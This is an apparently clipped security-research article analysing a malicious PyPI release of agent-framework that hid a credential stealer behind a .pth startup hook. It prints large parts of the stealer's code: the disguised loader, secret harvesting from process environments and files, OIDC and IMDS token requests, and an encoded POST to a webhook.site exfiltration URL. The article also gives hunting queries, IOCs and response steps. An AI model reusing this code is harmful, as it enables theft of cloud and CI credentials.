---
title: We caught the agent-framework PyPI compromise six minutes after it published
source: https://www.elastic.co/security-labs/threat-command/we-caught-the-agent-framework-pypi-compromise-six-minutes-after-it-published
source_host: www.elastic.co
clip_date: 2026-11-19T09:07:27+08:00
trace_id: c01cdd80-59bd-43a3-a1a4-b78445c05828
content_hash: ebc6dc3471d72e4b1bcc364201bb65a652d34283b141158a85f97405323483d1
status: synced
tags: []
series: null
feed_source: Elastic Security Labs
ai_summary: null
ai_summary_style: null
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 41d75244-d011-815c-a08c-f4704d839c3c
ioc:
  cves: []
  cwes: []
  hashes:
    - 21f28e8517a10ffe431f8d68f5875c85eca4001ae6d118322b0a41873998eb5e
    - 325e7e9f0ec94e41ad1a1b7a3f18a6b8b5bffece2e2b97b8d3369eb967452f93
    - 39fa329f2a93f734b0bb8f5adb203ea3331d1ae479832a5015a54cb17aabd663
    - 3d20a8bc91351a9a16b6db243b848ceca0206b7a8623b02d2af553a9c9f7e0a9
    - 54d885b7d7161c9ed96489c66364c4bfbf635929166843bba10d97d46b5a2e1f
    - c275ccbe520ef3c0f02dc6a35389e427f9f1b4e0b12e140cd7bf7179ce143f02
    - d27fa34414e6201d5e03e559ef634f020057554d7b3f4898dd5d7cd3e989e110
  domains:
    - webhook.site
  tools: []
  techniques: []
---

## The compromise, and how we detected it

Microsoft’s Agent Framework is an open-source, multi-language framework used to build and orchestrate AI agents within the Microsoft Azure ecosystem. The compromised package is the meta-package, a thin wrapper used to pull in the different framework dependencies. The agent-framework averages 196,000 [downloads](https://pypistats.org/packages/agent-framework) a month across all versions. If versions `1.26.1` or `1.26.2` touched a build agent or a laptop, assume every secret on that host is gone, and pin back to 1.26.0.

[agent-framework](https://github.com/microsoft/agent-framework) `1.26.1` went live on PyPI at 20:35 UTC on November 17, 2026. Our [supply-chain monitor](https://github.com/elastic/supply-chain-monitor) flagged it as malicious at 20:41 UTC, and we [published the details](https://x.com/elasticseclabs/status/2122810560106438890?a=ZyaB8TnnhUzADD6jR-w&s=20) that evening. Version `1.26.2` followed at 21:08 UTC with the same stealer under new filenames. PyPI [removed both](https://pypi.org/project/agent-framework/1.26.1/#history) within the hour.

Both versions shipped a `.pth` startup hook (a plain-text configuration file processed automatically by Python's site module every time the interpreter starts up), so the credential stealer ran every time Python started on the host. Importing the package was never necessary. It read environment variables from up to 300 running processes, Azure CLI token caches, and pip, npm, Docker, git, and Hugging Face credentials, then called Azure DevOps and GitHub Actions OIDC endpoints and the Azure Instance Metadata Service to mint fresh cloud tokens. Those tokens are how a compromised build can reach the Azure subscription behind it. Everything collected went to a single `webhook[.]site` endpoint, zlib-compressed and Base64-encoded.

![Supply Chain Monitor initial notifications](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/1c835f0feedee5a5.png)

## How the agent-framework.pth hook triggers the stealer (1.26.1)

The attacker added two new files (`agent_framework_meta.pth`, `_telemetry.py`) and modified one file (`__init__.py`) in the 1.26.1 compromised package.

The attack is triggered by the `.pth` hook based on the following single line:

```
import agent_framework_meta
```

Every time Python starts, its `site` module processes any `.pth` files in the `site-packages` directory. Any line in these files that begins with `import` is executed as code, before the user’s script or any other code runs.

This import executes the package’s `__init__.py`, which contains a loader appended to the end of the file that imports `_telemetry.py` and calls its `_start()` function.

```python
# Lightweight runtime diagnostics hook.
try:
    from . import _telemetry as _telemetry
    _telemetry._start()
except Exception:
    pass
```

The `_start()` function uses an environment variable, `_AF_TEL`, to avoid running more than once per process tree, then forks a child process and detaches it with `setsid()`. The child collects secrets and POSTs them to `webhook[.]site` while the parent continues normally, so the theft adds no visible delay. On Windows, where `fork()` isn’t available, it runs the collection in a background thread instead.

```python
def _start():
    if os.environ.get("_AF_TEL"):
        return
    os.environ["_AF_TEL"] = "1"
    try:
        if hasattr(os, "fork"):
            pid = os.fork()
            if pid == 0:
                try:
                    os.setsid()
                except Exception:
                    pass
                _run()
                os._exit(0)
            return
    except Exception:
        pass
    try:
        import threading
        t = threading.Thread(target=_run)
        t.daemon = True
        t.start()
    except Exception:
        pass
```

## What the agent-framework credential stealer collects

### Environment variables from the host and running processes

The credential stealer collects environment variables whose names contain the following strings:

```
TOKEN, SECRET, PASSWORD, PASSWD, KEY, CONNECTION, ENDPOINT, AZURE, AWS, GITHUB,  GH_, HF_, HUGGING, OPENAI, FOUNDRY, VSS, SYSTEM, BUILD, AGENT, CI_, PIP, NPM, NUGET, COSMOS, STORAGE, SUBSCRIPTION,TENANT, CLIENT, IDENTITY,MSI,MANAGED
```

The stealer reads up to 300 running processes by reading `/proc/<pid>/environ,` keeping lines that contain secrets, including `SYSTEM_ACCESSTOKEN` and `IDENTITY_HEADER`.

```css
   for e in glob.glob("/proc/[0-9]*/environ")[:300]:
        try:
            raw = open(e, "rb").read().decode("utf-8", "replace")
            hits = []
            for kv in raw.split("\x00"):
                if any(x in kv.upper() for x in ("TOKEN","SECRET","PASSWORD","KEY=","ENDPOINT_AUTH","SYSTEM_ACCESSTOKEN","IDENTITY_HEADER")):
                    hits.append(kv[:2000])
            if hits:
                out["env"]["PROC:" + e] = "\n".join(hits)[:12000]
```

### Credential and configuration files on disk

The stealer checks a hardcoded list of glob patterns covering credential locations across all user home directories as well as `/root`. Targets include:

-   Azure CLI token caches (`~/.azure`),
-   Pip configuration: `pip.conf`, `.npmrc`, `.netrc`, `.git-credentials`
-   Docker `config.json`
-   Hugging Face tokens
-   Foundry configuration
-   `.env` files under `/app` and `/workspace`
-   Azure Pipelines agent `.credentials` files

### Azure DevOps OIDC tokens from the pipeline endpoint

If the stealer runs inside an Azure DevOps pipeline, it uses `SYSTEM_ACCESSTOKEN` to call the pipeline OIDC endpoint (`SYSTEM_OIDCREQUESTURI)`, first requesting the `api://AzureADTokenExchange` scope and then retrying with an empty request body. Neither request includes the `serviceConnectionId` parameter that Microsoft’s documented flow uses to issue a token for a specific service connection, so it is unclear whether these requests return a token that matches any federated credential.

If a usable token is obtained, whether through this request or from the environment variables exposed by Azure tasks, it could be exchanged for Microsoft Entra ID access as the identity behind the corresponding workflow identity federation service connection.

The attacker would gain that identity’s Azure role assignments, which may be limited to a single resource group or extend to an entire subscription, depending on how the service connection was configured.

```python
at = os.environ.get("SYSTEM_ACCESSTOKEN") or os.environ.get("SYSTEM_ACCESSTOKEN") or ""
oe = os.environ.get("SYSTEM_OIDCREQUESTURI") or ""

if oe and at:
    attempts = [
        ("?api-version=7.1", {"scopes": ["api://AzureADTokenExchange"]}),
        ("?api-version=7.1", {}),
    ]
    for suffix, body in attempts:
        try:
            # Request an OIDC token, authenticating with the pipeline's own access token
            req = urllib.request.Request(
                oe + suffix,
                data=json.dumps(body).encode(),
                headers={
                    "Authorization": "Bearer " + at,
                    "Content-Type": "application/json",
                },
                method="POST",
            )
            resp = urllib.request.urlopen(req, timeout=15)
            out["ado"]["oidc"] = resp.read().decode("utf-8", "replace")[:20000]

            # Stop after the first successful response
            if out["ado"]["oidc"]:
                break
        except Exception as ex:
            out["ado"].setdefault("oidc_err", []).append(str(ex)[:300])
```

### Azure managed identity tokens via IMDS

If the stealer is running on an Azure resource with a managed identity, it requests access tokens for that identity. On App Service and similar platforms, it uses the local identity endpoint (`IDENTITY_ENDPOINT` or `MSI_ENDPOINT`), and otherwise it queries the Azure Instance Metadata Service (IMDS) at `169.254.169[.]254`. It requests a separate token for each of 12 resources, including:

-   Azure Resource Manager
-   Microsoft Graph
-   Key Vault
-   Storage
-   Azure AI Foundry
-   Azure Machine Learning
-   Container Registry
-   Azure DevOps (`499b84ac-1321-427f-aa17-267ca6975798`)

Each token lets the attacker act as the managed identity against that service for as long as the token remains valid, with whatever permissions the identity has been granted. The stealer also collects IMDS instance metadata, such as the subscription ID, resource group, and VM name, which tells the attacker exactly which environment the stolen tokens belong to.

## Exfiltration to adversary-controlled infrastructure

The collected data, including the host context such as the hostname, username, and working directory, command-line arguments, and timestamp, is all bundled in a single `POST` request. This data is serialized to JSON, compressed with zlib, and Base64-encoded. The result is sent as the body in the outbound request to [`https://webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb?t=telemetry`](https://webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb?t=telemetry) with a User-Agent of `af-runtime-diagnostics/1`.

```python
_ENC = "aHR0cHM6Ly93ZWJob29rLnNpdGUvZDM4MWZkODAtZWM2Mi00MmFkLThmNWMtZDFiMTUxMDNjOWJi"
# https://webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb

def _post(tag, data):
    try:
        import urllib.request
        u = base64.b64decode(_ENC).decode()
        body = base64.b64encode(zlib.compress(json.dumps(data, default=str).encode("utf-8", "replace"), 9))
        req = urllib.request.Request(u + "?t=" + tag, data=body, headers={"Content-Type": "application/octet-stream", "User-Agent": "af-runtime-diagnostics/1"})
        urllib.request.urlopen(req, timeout=25).read()
    except Exception:
        pass
```

## What changed in agent-framework 1.26.2

| | 1.26.1 | 1.26.2 | |:---- |:---- |:---- | | Published (UTC) | 2026-11-17 20:35 | 2026-11-17 21:08 | | Startup hook | `agent_framework_meta.pth` | `af_runtime_diag.pth` | | Stealer module | `agent_framework_meta/_telemetry.py` | `af_runtime_diag.py` | | Exfil User-Agent | `af-runtime-diagnostics/1` | `runtime-diagnostics/1` | | Wheel SHA-256 | `d27fa344…e989e110` | `3d20a8bc…c9f7e0a9` | | GitHub Actions OIDC | No | Yes | | Exfil endpoint | Same webhook.site URL | Same webhook.site URL |

About 30 minutes after the first malicious package was published, the threat actor pushed a new version (`1.26.2`), restructuring how the attack chain loads and adding a new GitHub Actions collector. The attacker modified the package with a new `.pth` hook (`af_runtime_diag.pth`) and a new Python module (`af_runtime_diag.py`)

```
import af_runtime_diag
```

The Python module (`af_runtime_diag.py`) contains the exact same stealer code, except for the new addition of targeting GitHub Actions.

```python
u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL") or ""
t = (
    os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    or os.environ.get("ACTIONS_RUNTIME_TOKEN")
    or ""
)

if u and t:
    for aud in ("api://AzureADTokenExchange", "https://management.azure[.]com/"):
        try:
            # Append the requested audience to GitHub's OIDC token endpoint
            sep = "&" if "?" in u else "?"
            uu = u + sep + "audience=" + urllib.parse.quote(aud, safe="")

            req = urllib.request.Request(
                uu,
                headers={
                    "Authorization": "Bearer " + t,
                    "Accept": "application/json",
                    "User-Agent": "runtime-diagnostics/1",
                },
            )
            resp = urllib.request.urlopen(req, timeout=12)
            out["gh_oidc"][aud] = resp.read().decode("utf-8", "replace")[:20000]
        except Exception as ex:
            out["gh_oidc"].setdefault("err", []).append(aud + ":" + str(ex)[:200])
```

Both of the malicious releases point to the same exfiltration endpoint ([`https://webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb?t=telemetry`](https://webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb?t=telemetry)).

## Hunting queries for the agent-framework stealer

The following hunting queries can be used to find the associated activity:

```sql
FROM logs-endpoint.events.file-*
| WHERE event.action == "creation"
| WHERE file.name IN (
    "agent_framework_meta.pth",
    "_telemetry.py",
    "af_runtime_diag.pth",
    "af_runtime_diag.py"
  )
```

```
FROM logs-endpoint.events.network-*
| WHERE dns.question.name == "webhook[.]site"
```

## Elastic Defend has coverage for this supply-chain compromise through the following rules:

-   [Elastic Defend Alert from Package Manager Install Ancestry](https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/initial_access_elastic_defend_alert_package_manager_ancestor.toml)
-   [Suspicious Instance Metadata Service (IMDS) API Request](https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/credential_access_suspicious_instance_metadata_service_api_request.toml)
-   [Package Runtime Secret File Access Followed by IMDS Request](https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/credential_access_secret_file_access_followed_by_imds_request.toml)

## How to respond to the agent-framework supply-chain compromise

-   Check for impact by searching the following files in `site-packages` folders (`agent_framework_meta.pth`, `af_runtime_diag.pth`).
-   Pin the clean build of agent-framework (`1.26.0`).
-   Treat everything readable on impacted hosts as compromised. This includes environment variables of all running processes, credential and configuration files, cached cloud and CLI tokens, and any secrets exposed to builds or workloads on the host. Rotate long-lived secrets and review activity for short-lived tokens that can’t be revoked.
-   Search proxy, DNS, or firewall logs to `webhook[.]site` using User-Agents (`af-runtime-diagnostics/1`, `runtime-diagnostics/1`).
-   Consider adding a delay before adopting newly published packages, since this attack was caught and removed within hours.

## Indicators of compromise for agent-framework 1.26.1 and 1.26.2

The following observables were discussed in this research.

| Observable | Type | Name | Reference | |:---- |:---- |:---- |:---- | | `https://webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb?t=telemetry` | URL | | Exfil Endpoint | | `af-runtime-diagnostics/1` | User Agent | | | | `runtime-diagnostics/1` | User Agent | | | | `d27fa34414e6201d5e03e559ef634f020057554d7b3f4898dd5d7cd3e989e110` | SHA-256 | `agent_framework-1.26.1-py3-none-any.whl` | | | `3d20a8bc91351a9a16b6db243b848ceca0206b7a8623b02d2af553a9c9f7e0a9` | SHA-256 | `agent_framework-1.26.2-py3-none-any.whl` | | | `39fa329f2a93f734b0bb8f5adb203ea3331d1ae479832a5015a54cb17aabd663` | SHA-256 | `_telemetry.py` | | | `c275ccbe520ef3c0f02dc6a35389e427f9f1b4e0b12e140cd7bf7179ce143f02` | SHA-256 | `agent_framework_meta/__init__.py` | | | `21f28e8517a10ffe431f8d68f5875c85eca4001ae6d118322b0a41873998eb5e` | SHA-256 | `agent_framework_meta.pth` | | | `54d885b7d7161c9ed96489c66364c4bfbf635929166843bba10d97d46b5a2e1f` | SHA-256 | `af_runtime_diag.py` | | | `325e7e9f0ec94e41ad1a1b7a3f18a6b8b5bffece2e2b97b8d3369eb967452f93` | SHA-256 | `af_runtime_diag.pth` | |
